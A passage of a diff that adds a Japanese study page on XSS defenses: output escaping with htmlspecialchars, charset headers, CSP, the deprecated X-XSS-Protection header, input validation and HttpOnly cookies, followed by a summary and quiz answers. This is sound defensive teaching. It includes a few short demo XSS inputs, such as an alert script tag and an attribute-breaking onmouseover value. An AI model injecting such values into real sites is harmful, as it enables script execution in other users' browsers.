+        <tr><td>React / Vue</td><td>JSX / テンプレートがデフォルトでエスケープ</td></tr>
+        <tr><td>EJS</td><td><code>&lt;%= %&gt;</code> はエスケープあり</td></tr>
+        <tr><td>Twig (PHP)</td><td>デフォルトでエスケープ</td></tr>
+        <tr><td>Blade (PHP)</td><td><code>{{ }}</code> はエスケープあり</td></tr>
+      </tbody>
+    </table></div>
+    <div class="callout warn">
+      <p class="callout-title">注意</p>
+      <p><code>innerHTML</code> や <code>{!! !!}</code>（Blade のエスケープなし出力）を使うと脆弱になる。</p>
+    </div>
+
+    <h2 id="sec-9"><span class="num">9.</span>htmlspecialchars 関数</h2>
+    <p><strong>htmlspecialchars</strong> は、PHP で HTML エスケープを行う標準関数です。</p>
+
+    <h3 id="sec-9-1">9.1 基本構文</h3>
+    <pre><code>htmlspecialchars(string $string, int $flags, ?string $encoding): string</code></pre>
+
+    <h3 id="sec-9-2">9.2 使用例</h3>
+    <pre><code>$input = '&lt;script&gt;alert("XSS")&lt;/script&gt;';
+
+// 基本的な使い方
+echo htmlspecialchars($input);
+// 出力: &amp;lt;script&amp;gt;alert(&amp;quot;XSS&amp;quot;)&amp;lt;/script&amp;gt;
+
+// 推奨：ENT_QUOTES でシングルクォートもエスケープ
+echo htmlspecialchars($input, ENT_QUOTES, 'UTF-8');</code></pre>
+
+    <h3 id="sec-9-3">9.3 フラグ（第2引数）</h3>
+    <div class="table-wrap"><table>
+      <thead><tr><th>フラグ</th><th>効果</th></tr></thead>
+      <tbody>
+        <tr><td><code>ENT_QUOTES</code></td><td>シングルクォート <code>'</code> もエスケープ（<strong>推奨</strong>）</td></tr>
+        <tr><td><code>ENT_COMPAT</code></td><td>ダブルクォート <code>"</code> のみエスケープ（デフォルト）</td></tr>
+        <tr><td><code>ENT_HTML5</code></td><td>HTML5 向けのエスケープ</td></tr>
+      </tbody>
+    </table></div>
+    <div class="callout warn">
+      <p class="callout-title">補足：PHP 8.1 以降はデフォルトが変わっています</p>
+      <p>「<code>ENT_COMPAT</code> がデフォルト」は PHP 8.0 までの話です。PHP 8.1 以降のデフォルトは <code>ENT_QUOTES | ENT_SUBSTITUTE | ENT_HTML401</code> で、シングルクォートもエスケープされます。それでも、古い環境との違いで事故が起きないよう、<code>ENT_QUOTES</code> と <code>'UTF-8'</code> を毎回明示する書き方が安全です。</p>
+    </div>
+
+    <h3 id="sec-9-4">9.4 エンコーディング（第3引数）</h3>
+    <pre><code>// UTF-8 を明示（推奨）
+htmlspecialchars($input, ENT_QUOTES, 'UTF-8');</code></pre>
+    <p><strong>必ず UTF-8 を指定</strong> し、文字化けやエンコーディング不一致による XSS を防ぐ。</p>
+
+    <h3 id="sec-9-5">9.5 関連関数</h3>
+    <div class="table-wrap"><table>
+      <thead><tr><th>関数</th><th>用途</th></tr></thead>
+      <tbody>
+        <tr><td><code>htmlspecialchars</code></td><td>HTML 出力用エスケープ</td></tr>
+        <tr><td><code>htmlentities</code></td><td>より多くの文字を実体参照に変換</td></tr>
+        <tr><td><code>htmlspecialchars_decode</code></td><td>エスケープを元に戻す（表示時は通常不要）</td></tr>
+      </tbody>
+    </table></div>
+
+    <h3 id="sec-9-6">9.6 他言語での同等機能</h3>
+    <div class="table-wrap"><table>
+      <thead><tr><th>言語</th><th>関数・方法</th></tr></thead>
+      <tbody>
+        <tr><td>PHP</td><td><code>htmlspecialchars()</code></td></tr>
+        <tr><td>Python</td><td><code>html.escape()</code></td></tr>
+        <tr><td>JavaScript</td><td>テンプレートエンジン / <code>he</code> ライブラリ</td></tr>
+        <tr><td>Ruby</td><td><code>ERB::Util.html_escape()</code></td></tr>
+      </tbody>
+    </table></div>
+
+    <h2 id="sec-10"><span class="num">10.</span>レスポンスの文字エンコーディング指定</h2>
+    <p>XSS 対策として、レスポンスの <strong>文字エンコーディング</strong>（文字をバイト列で表すときの規則。UTF-8 や Shift_JIS など）を明示することが重要です。ブラウザが文字コードを誤解すると、フィルタをすり抜ける攻撃（エンコーディング攻撃）の原因になります。</p>
+
+    <h3 id="sec-10-1">10.1 Content-Type ヘッダ</h3>
+    <pre><code>Content-Type: text/html; charset=UTF-8
+                              ↑
+                    文字エンコーディングを明示</code></pre>
+
+    <h3 id="sec-10-2">10.2 HTML の meta タグ（補助的）</h3>
+    <pre><code>&lt;meta charset="UTF-8"&gt;</code></pre>
+    <p><strong>注意：</strong>HTTP ヘッダの <code>Content-Type</code> が優先されます。meta タグだけに頼らない。</p>
+
+    <h3 id="sec-10-3">10.3 なぜ重要か</h3>
+    <div class="table-wrap"><table>
+      <thead><tr><th>問題</th><th>説明</th></tr></thead>
+      <tbody>
+        <tr><td><strong>文字コードの不一致</strong></td><td>UTF-8 想定のデータを Shift_JIS として解釈</td></tr>
+        <tr><td><strong>エンコーディング攻撃</strong></td><td>特殊なバイト列で <code>&lt;script&gt;</code> を別の形で表現</td></tr>
+        <tr><td><strong>フィルタ回避</strong></td><td>エンコーディングの違いでサニタイズ（危険な文字の除去・無害化）をすり抜ける</td></tr>
+      </tbody>
+    </table></div>
+
+    <h3 id="sec-10-4">10.4 設定例</h3>
+    <span class="code-label good">○ PHP</span>
+    <pre><code>// PHP
+header('Content-Type: text/html; charset=UTF-8');</code></pre>
+    <span class="code-label good">○ Express.js</span>
+    <pre><code>// Express.js
+app.use((req, res, next) =&gt; {
+  res.setHeader('Content-Type', 'text/html; charset=UTF-8');
+  next();
+});</code></pre>
+
+    <h3 id="sec-10-5">10.5 ベストプラクティス</h3>
+    <ul>
+      <li>アプリ全体で <strong>UTF-8 に統一</strong></li>
+      <li>入力・DB・出力すべて同じエンコーディングを使用</li>
+      <li>レスポンスヘッダで <strong>charset=UTF-8 を必ず指定</strong></li>
+    </ul>
+
+    <h2 id="sec-11"><span class="num">11.</span>XSS に対する保険的対策</h2>
+    <p>HTMLエスケープが <strong>根本対策</strong> である一方、万が一 XSS が起きた場合の被害を <strong>軽減する保険</strong> も存在します。これらだけでは XSS を防げません。複数の守りを重ねる考え方は <a href="../../71_セキュリティ基礎/00_全体像/20-2_深層防御.html">深層防御</a> を参照してください。</p>
+    <pre><code>根本対策:  HTMLエスケープ、CSP
+保険的対策: HttpOnly、X-XSS-Protection 等</code></pre>
+    <div class="callout warn">
+      <p class="callout-title">補足：CSP は「保険的対策」側です</p>
+      <p>ノートのこの図では CSP が根本対策に入っていますが、同じノートのまとめや優先順位では CSP は保険的対策として扱われています。CSP は XSS が起きたときに <strong>スクリプトの実行を止めて被害を抑える</strong> 仕組みで、XSS の原因（エスケープ漏れ）そのものはなくしません。根本対策はあくまで出力時のエスケープで、CSP は保険として重ねる層と考えるのが一般的です（→ <a href="10-4_CSP.html">CSP</a>）。</p>
+    </div>
+
+    <h2 id="sec-12"><span class="num">12.</span>X-XSS-Protection レスポンスヘッダ</h2>
+    <p><strong>X-XSS-Protection</strong> は、ブラウザ内蔵の XSS フィルタを有効にする HTTP レスポンスヘッダでした。</p>
+    <pre><code>X-XSS-Protection: 1; mode=block</code></pre>
+    <div class="table-wrap"><table>
+      <thead><tr><th>値</th><th>意味</th></tr></thead>
+      <tbody>
+        <tr><td><code>0</code></td><td>フィルタを無効化</td></tr>
+        <tr><td><code>1</code></td><td>フィルタを有効化</td></tr>
+        <tr><td><code>1; mode=block</code></td><td>検出時にページ表示をブロック</td></tr>
+      </tbody>
+    </table></div>
+
+    <h3 id="sec-12-1">12.1 現状</h3>
+    <div class="table-wrap"><table>
+      <thead><tr><th>ポイント</th><th>説明</th></tr></thead>
+      <tbody>
+        <tr><td><strong>非推奨</strong></td><td>Chrome 等の主要ブラウザでは削除または無効化済み</td></tr>
+        <tr><td><strong>限界</strong></td><td>ブラウザ依存で、すべての XSS を防げない</td></tr>
+        <tr><td><strong>位置づけ</strong></td><td>保険的対策。エスケープの代わりにはならない</td></tr>
+      </tbody>
+    </table></div>
+    <div class="callout warn">
+      <p class="callout-title">補足：今は「1; mode=block」を付けません</p>
+      <p>ブラウザの XSS フィルタは、それ自体が情報漏えいなどの新しい脆弱性の原因になったため廃止されました。現在の推奨は <strong>ヘッダを付けないか、付けるなら <code>X-XSS-Protection: 0</code>（無効化）</strong> です。上の <code>1; mode=block</code> は過去の設定例として読んでください（→ <a href="10-5_セキュリティヘッダ.html#sec-9">セキュリティヘッダ「付けない・消すべきヘッダ」</a>）。</p>
+    </div>
+
+    <h3 id="sec-12-2">12.2 現代の推奨</h3>
+    <p>X-XSS-Protection の代わりに <strong>Content-Security-Policy（CSP）</strong> の導入が推奨されます。</p>
+    <pre><code>Content-Security-Policy: default-src 'self'; script-src 'self'</code></pre>
+    <p>CSP は「このページでは信頼できるソースのスクリプトだけ実行する」と宣言する仕組みで、XSS の影響を大幅に軽減できます。ディレクティブ（<code>script-src</code> などの指定項目）や nonce の使い方は <a href="10-4_CSP.html">CSP（コンテンツセキュリティポリシー）</a> で詳しく扱っています。</p>
+
+    <h2 id="sec-13"><span class="num">13.</span>入力値検証</h2>
+    <p>第4章で学んだ <strong>入力値検証</strong>（受け取った値が、決めた形式・長さ・文字種に合っているかを確かめること）は、XSS 対策の <strong>補助</strong> として有効です。ただし、<strong>入力値検証だけでは XSS を完全に防げません</strong>。</p>
+
+    <h3 id="sec-13-1">13.1 入力値検証でできること</h3>
+    <div class="table-wrap"><table>
+      <thead><tr><th>チェック</th><th>例</th></tr></thead>
+      <tbody>
+        <tr><td>制御文字の除去</td><td>改行・NULL の排除</td></tr>
+        <tr><td>文字数制限</td><td>コメント 500文字以内</td></tr>
+        <tr><td>許可文字の制限</td><td>ユーザー名は英数字のみ</td></tr>
+        <tr><td>タグの禁止</td><td><code>&lt;</code>, <code>&gt;</code> を含む入力を拒否</td></tr>
+      </tbody>
+    </table></div>
+    <span class="code-label good">○ ホワイトリスト（許可する文字だけを決める方式）</span>
+    <pre><code>// ホワイトリスト：英数字と日本語のみ許可
+function validateComment(text) {
+  if (!/^[\w\u3040-\u309F\u30A0-\u30FF\u4E00-\u9FFF\s]+$/.test(text)) {
+    return '使用できない文字が含まれています';
+  }
+  if (text.length &gt; 500) {
+    return '500文字以内で入力してください';
+  }
+  return null;
+}</code></pre>
+    <p>正規表現の <code>\u3040-\u309F</code> はひらがな、<code>\u30A0-\u30FF</code> はカタカナ、<code>\u4E00-\u9FFF</code> は漢字の範囲です。この例では「。」「、」や「！」も許可されていないため、普通の日本語コメントも弾かれます。これは下の「正当な入力を拒否」という限界の具体例にもなっています。</p>
+
+    <h3 id="sec-13-2">13.2 入力値検証の限界</h3>
+    <div class="table-wrap"><table>
+      <thead><tr><th>限界</th><th>理由</th></tr></thead>
+      <tbody>
+        <tr><td><strong>ブラックリストは不完全</strong></td><td><code>&lt;script&gt;</code> 以外にも <code>&lt;img onerror=...&gt;</code> 等、多数の手法がある</td></tr>
+        <tr><td><strong>正当な入力を拒否</strong></td><td>「<code>&lt;</code> を含む」等のルールは <code>&lt;3</code> など正常な入力も弾く</td></tr>
+        <tr><td><strong>エンコーディングの回避</strong></td><td>フィルタをエンコーディングの差ですり抜けられる</td></tr>
+      </tbody>
+    </table></div>
+    <p>ブラックリストとは、禁止する文字やパターンを列挙する方式です。危ない記号をすべて自分で見つける前提なので、1か所でも漏れればそこから入られます。</p>
+    <div class="callout key">
+      <p class="callout-title">結論</p>
+      <p>入力値検証は <strong>第1の防御線</strong> として有用だが、<strong>出力時の HTMLエスケープが必須</strong>。チェックは入口、境界で分ける（エスケープする）のは最後の砦という <strong>二重の守り</strong> が基本です。</p>
+    </div>
+
+    <h2 id="sec-14"><span class="num">14.</span>クッキーに HttpOnly 属性を付与</h2>
+    <p><strong>HttpOnly</strong> 属性は、JavaScript から Cookie にアクセスできなくする属性です。XSS による <strong>Cookie 盗み出し</strong> を防ぐ保険的対策として重要です。Cookie 属性そのものの詳しい説明は、74 セッション管理（10 クッキー）で扱います。</p>
+
+    <h3 id="sec-14-1">14.1 設定方法</h3>
+    <pre><code>Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict
+                              ↑
+                    JavaScript から読めなくなる</code></pre>
+    <span class="code-label good">○ Express.js</span>
+    <pre><code>// Express.js
+res.cookie('sessionId', sessionId, {
+  httpOnly: true,
+  secure: true,
+  sameSite: 'strict'
+});</code></pre>
+
+    <h3 id="sec-14-2">14.2 効果</h3>
+    <span class="code-label bad">✕ HttpOnly なし</span>
+    <pre><code>// HttpOnly なし
+document.cookie;  // "sessionId=abc123"  ← XSS で盗める</code></pre>
+    <span class="code-label good">○ HttpOnly あり</span>
+    <pre><code>// HttpOnly あり
+document.cookie;  // ""  ← sessionId は含まれない</code></pre>
+    <div class="table-wrap"><table>
+      <thead><tr><th>属性</th><th>XSS 対策での役割</th></tr></thead>
+      <tbody>
+        <tr><td><strong>HttpOnly</strong></td><td>JS から Cookie を読めなくする</td></tr>
+        <tr><td><strong>Secure</strong></td><td>HTTPS のみ送信（盗聴防止）</td></tr>
+        <tr><td><strong>SameSite</strong></td><td>クロスサイト送信を制限（CSRF 対策にも有効）</td></tr>
+      </tbody>
+    </table></div>
+    <p>CSRF（クロスサイトリクエストフォージェリ）は、<a href="30-1_CSRF.html">CSRF</a> のページで扱います。</p>
+
+    <h3 id="sec-14-3">14.3 注意点</h3>
+    <div class="table-wrap"><table>
+      <thead><tr><th>注意</th><th>説明</th></tr></thead>
+      <tbody>
+        <tr><td><strong>XSS 自体は防がない</strong></td><td>ページ改ざん・キーロギング等は依然として可能</td></tr>
+        <tr><td><strong>セッションID以外</strong></td><td>localStorage（ブラウザにデータを保存する仕組み。JS から自由に読める）に保存したトークンは HttpOnly では守れない</td></tr>
+        <tr><td><strong>根本対策ではない</strong></td><td>HTMLエスケープと併用する</td></tr>
+      </tbody>
+    </table></div>
+    <p>たとえば HttpOnly で Cookie を読めなくしても、<a href="#sec-4">ワーム</a> のように閲覧者の権限でリクエストを送ることはできてしまいます。</p>
+
+    <h2 id="sec-15"><span class="num">15.</span>まとめ</h2>
+    <div class="table-wrap"><table>
+      <thead><tr><th>トピック</th><th>要点</th></tr></thead>
+      <tbody>
+        <tr><td>XSS</td><td>悪意ある JavaScript を被害者のブラウザで実行させる攻撃</td></tr>
+        <tr><td>データと命令</td><td>データのつもりの文字が命令として読まれるのが原因。<strong>消すより混ぜない</strong></td></tr>
+        <tr><td>Cookie 盗み出し</td><td><code>document.cookie</code> 経由。HttpOnly で軽減</td></tr>
+        <tr><td>XSS ワーム</td><td>持続型 XSS で自動拡散</td></tr>
+        <tr><td>反射型 XSS</td><td>リクエストに含まれ、その場で反映（非持続型）</td></tr>
+        <tr><td>持続型 XSS</td><td>DB に保存され、閲覧者全員が実行（危険度が高い）</td></tr>
+        <tr><td>HTMLエスケープ</td><td>出力時に <code>&lt;</code>, <code>&gt;</code>, <code>"</code> 等を変換（<strong>根本対策</strong>）</td></tr>
+        <tr><td>要素内容の XSS</td><td>コンテキスト（要素・属性・JS）に応じたエスケープが必要</td></tr>
+        <tr><td>htmlspecialchars</td><td>PHP の HTML エスケープ関数（ENT_QUOTES, UTF-8 推奨）</td></tr>
+        <tr><td>文字エンコーディング</td><td><code>Content-Type: charset=UTF-8</code> を明示</td></tr>
+        <tr><td>保険的対策</td><td>HttpOnly、CSP 等（エスケープの代わりにはならない）</td></tr>
+        <tr><td>X-XSS-Protection</td><td>旧来のブラウザフィルタ（現在は非推奨、CSP を推奨。付けるなら <code>0</code>）</td></tr>
+        <tr><td>入力値検証</td><td>補助的対策。出力エスケープと併用</td></tr>
+        <tr><td>HttpOnly</td><td>JS から Cookie を読めなくする</td></tr>
+      </tbody>
+    </table></div>
+
+    <h3 id="sec-15-1">15.1 XSS 対策の優先順位</h3>
+    <ol class="steps">
+      <li>出力時の HTMLエスケープ（必須）</li>
+      <li>テンプレートエンジンの自動エスケープを利用</li>
+      <li>Content-Security-Policy（CSP）の設定</li>
+      <li>入力値検証（補助）</li>
+      <li>Cookie に HttpOnly ＋ Secure ＋ SameSite を設定（保険）</li>
+    </ol>
+    <p>次のページでは、属性値や JavaScript の中など、出力する場所ごとの XSS をさらに詳しく見ていきます。</p>
+
+    <h2 id="sec-16"><span class="num">16.</span>理解度チェック</h2>
+    <details>
+      <summary>Q1. XSS で被害を受けるのは誰ですか？ SQLインジェクションとの共通点は何ですか？</summary>
+      <div class="body">
+        <p>被害を受けるのは、攻撃コードを書いた人ではなく <strong>そのページを見た人（のブラウザ）</strong> です。SQLインジェクションとは読み手（DB かブラウザか）が違うだけで、どちらも <strong>データのつもりの文字が命令として読まれる</strong> という同じ形の穴です。</p>
+      </div>
+    </details>
+    <details>
+      <summary>Q2. 反射型 XSS と持続型 XSS では、どちらが危険度が高いですか？ その理由は？</summary>
+      <div class="body">
+        <p><strong>持続型</strong> です。攻撃コードが DB などに保存されるため、URL を踏ませなくても <strong>ページを見た全員</strong> のブラウザで実行され、ワームとして自動拡散もしやすいからです。反射型は、罠の URL を開いた人だけが被害を受けます。</p>
+      </div>
+    </details>
+    <details>
+      <summary>Q3. HTML エスケープは、入力時と出力時のどちらで行うべきですか？</summary>
+      <div class="body">
+        <p><strong>出力時（表示直前）</strong> です。入力時にエスケープすると DB にエスケープ済みのデータが入り、二重エスケープの原因になります。また、出力先（HTML本文・属性・JavaScript・URL）によって必要な変換が違うため、出力する場所に合わせて行います。</p>
+      </div>
+    </details>
+    <details>
+      <summary>Q4. <code>&lt;input value="&lt;?= $keyword ?&gt;"&gt;</code> に <code>" onmouseover="alert(1)</code> を入れられると何が起きますか？ どう防ぎますか？</summary>
+      <div class="body">
+        <p>先頭の <code>"</code> で value 属性が閉じ、<code>onmouseover="alert(1)"</code> が新しい属性として追加され、マウスを乗せるとスクリプトが動きます。属性値を必ずダブルクォートで囲み、<code>htmlspecialchars($keyword, ENT_QUOTES, 'UTF-8')</code> のように <code>"</code> もエスケープして出力します。</p>
+      </div>
+    </details>
+    <details>
+      <summary>Q5. Cookie に HttpOnly を付ければ、XSS 対策は十分ですか？</summary>
+      <div class="body">
+        <p><strong>十分ではありません。</strong> HttpOnly は <code>document.cookie</code> から Cookie を読めなくするだけで、XSS 自体は防ぎません。ページ改ざん・キーロギング・閲覧者の権限での自動投稿などは依然として可能で、localStorage のトークンも守れません。出力時のエスケープと併用する保険です。</p>
+      </div>
+    </details>
+    <details>
+      <summary>Q6. 今から新しくサイトを作るとき、<code>X-XSS-Protection: 1; mode=block</code> を設定すべきですか？</summary>
+      <div class="body">
+        <p><strong>いいえ。</strong> ブラウザの XSS フィルタは廃止されており、フィルタ自体が脆弱性の原因になったこともあります。付けるなら <code>0</code>（無効化）にし、被害を抑える保険には CSP を使います。もちろん根本対策は出力時のエスケープです。</p>
+      </div>
+    </details>
+    <details>
+      <summary>Q7. 「入力チェックで <code>&lt;script&gt;</code> を禁止したから XSS は大丈夫」と言われました。何が問題ですか？</summary>
+      <div class="body">
+        <p>ブラックリストは不完全で、<code>&lt;img onerror=...&gt;</code> など <code>&lt;script&gt;</code> を使わない手口がたくさんあります。エンコーディングの差ですり抜けられることもあります。入力値検証は補助として役立ちますが、出力時のエスケープ（境界で分けること）が必須です。</p>
+      </div>
+    </details>
+
+    <h2 id="sources">参考資料</h2>
+    <ul class="sources">
+      <li>ノート：72_Web脆弱性対策/20_インジェクション/01_XSS基本編（徳丸本5章）</li>
+      <li>ノート：72_Web脆弱性対策/20_インジェクション/04_SQLインジェクションとXSS（ねる前エンジニアリング）</li>
+      <li>徳丸浩『体系的に学ぶ 安全なWebアプリケーションの作り方 第2版』SBクリエイティブ</li>
+      <li>ねる前エンジニアリング「よくある脆弱性の中身 — SQLインジェクションとXSS」 https://www.youtube.com/watch?v=XrUN2NfrNi4</li>
+      <li>OWASP Cheat Sheet Series「Cross Site Scripting Prevention Cheat Sheet」 https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html</li>
+      <li>PHP マニュアル「htmlspecialchars」 https://www.php.net/manual/ja/function.htmlspecialchars.php</li>
+      <li>MDN Web Docs「X-XSS-Protection」 https://developer.mozilla.org/ja/docs/Web/HTTP/Headers/X-XSS-Protection</li>
+    </ul>
+
+    <nav class="pager" aria-label="ページ移動">
+      <a class="prev" href="10-5_セキュリティヘッダ.html"><span class="lbl">← 前のページ</span>セキュリティヘッダ</a>
+      <a class="idx" href="00-0_目次.html">目次</a>
+      <a class="next" href="20-2_XSS発展編.html"><span class="lbl">次のページ →</span>XSS発展編：属性・JavaScript内のXSS</a>
+    </nav>
+  </main>
+</div>
+
+<script src="../../_解説HTML/script.js"></script>
+</body>
+</html>
